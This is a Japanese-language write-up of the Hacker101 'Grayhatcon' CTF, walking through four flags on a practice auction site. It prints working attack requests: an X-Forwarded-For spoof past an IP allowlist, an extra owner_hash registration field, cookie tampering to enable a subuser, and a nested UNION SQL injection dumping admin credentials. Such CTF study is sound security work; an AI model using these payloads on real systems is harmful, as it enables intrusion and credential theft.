# Grayhatcon CTF（HackerBay）— 4/4

2026-11-02 に4つのフラグを提出し、Hacker101 CTF一覧で **4/4、合計244点**を確認した。対象の「HackerOne Username/Password List」は演習用管理画面で削除成功と表示された。インスタンス固有のホスト、フラグ、Cookie、アカウント識別値、ログイン情報は公開しない。

## 調査の入口

トップページの案内は、`hunter2` が出品した漏えいリストを削除することだった。対象は `/auction/8` にあった。`/robots.txt` は `/s3cr3t-4dm1n/` を示し、その管理ページは通常のアクセスで403を返した。同ディレクトリの `.htaccess` には `8.8.8.8` と `8.8.4.4` の許可設定があった。

エンドポイントと攻撃の組み立てには[先行する解法](https://krash.dev/posts/bug-bounty-summit-ctf-writeup/)を参考にした。以下の成功・失敗の応答と4件の提出結果は、このインスタンスで実際に確認した。

## フラグ1: クライアントIPの扱い

`GET /s3cr3t-4dm1n/` は403だったが、`X-Forwarded-For: 8.8.8.8` を付けると管理ログイン画面が返り、そこにフラグが表示された。リバースプロキシ側が依頼者の指定したヘッダーをIP判定に使っていた。

```http
GET /s3cr3t-4dm1n/ HTTP/1.1
X-Forwarded-For: 8.8.8.8
```

## フラグ2: 登録時の余分な項目

`/auction/8` は出品者名を `hunter2` と表示した。`POST /reset` に `username=hunter2` を送ると、次の質問フォームに隠し `account_hash` が含まれていた。ここでは質問に答えたりパスワードを変更したりせず、識別値だけ確認した。

通常の `/register` フォームが送るのは `new_username` と `new_password` だが、`owner_hash` も受け付けた。演習用の新規アカウントを作るとき、`owner_hash=<hunter2の識別値>` を加えると「Awaiting Activation」の画面にフラグが出た。

```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

owner_hash=<hunter2の識別値>&new_username=<演習用ユーザー>&new_password=<演習用パスワード>
```

## フラグ3: サブユーザー有効化の権限確認

作成したサブユーザーはログインできても「Awaiting Activation」に止まった。ログイン時の `userhash` Cookie に、そのサブユーザーの識別値が含まれた。別途作成した通常アカウントの `token` と、`hunter2` の識別値を入れた `userhash` を組み合わせ、サブユーザー有効化のPOSTを送った。

```http
POST /dashboard/subusers HTTP/1.1
Cookie: token=<通常アカウントのログイントークン>; userhash=<hunter2の識別値>
Content-Type: application/x-www-form-urlencoded

hash=<作成したサブユーザーの識別値>&enable_toggle=enable
```

応答はダッシュボードへリダイレクトした。その後サブユーザーでログインし直すと、有効化待ち画面ではなくダッシュボードに入り、アカウント情報の横にフラグが表示された。ダッシュボードの「Your Auctions」には、対象出品の管理用ハッシュも表示された。

## フラグ4: 質問APIのSQL注入と出品削除

有効化したサブユーザーは `/dashboard/auctions` に入れた。出品作成フォームの質問API `/dashboard/auctions/questions?id=5` はJSONを返した。`id=5 AND 0--` は無効なタイプ、`id=5 AND 1--` は通常のJSONになり、条件式がクエリに効いていた。

[先行解法](https://krash.dev/posts/bug-bounty-summit-ctf-writeup/)に記載された外側3列・内側9列の構造を手がかりに、次の二段階の `UNION` を検証した。外側の第3列はJSON配列 `[]` として与え、内側のクエリで `admin` 表の `username` と `password` を応答の `auctions` に表示させた。

```sql
0 UNION SELECT
  '0 UNION SELECT username,2,3,4,5,password,7,8,9 FROM admin',
  2,
  '[]'--
```

取得した演習用管理ログイン情報で `/s3cr3t-4dm1n/` にログインした。管理画面へは引き続き `X-Forwarded-For: 8.8.8.8` を付けた。ダッシュボードで確認した対象出品のハッシュを入力すると「HackerOne Username/Password List」の削除画面が開いた。`auction_hash=<対象ハッシュ>&action=delete` の送信後、「Auction listing has been deleted」と最後のフラグが表示された。

## 後片付け

検証用のCookieファイルは削除した。演習用アカウントの識別値や管理ログイン情報は公開記録に含めていない。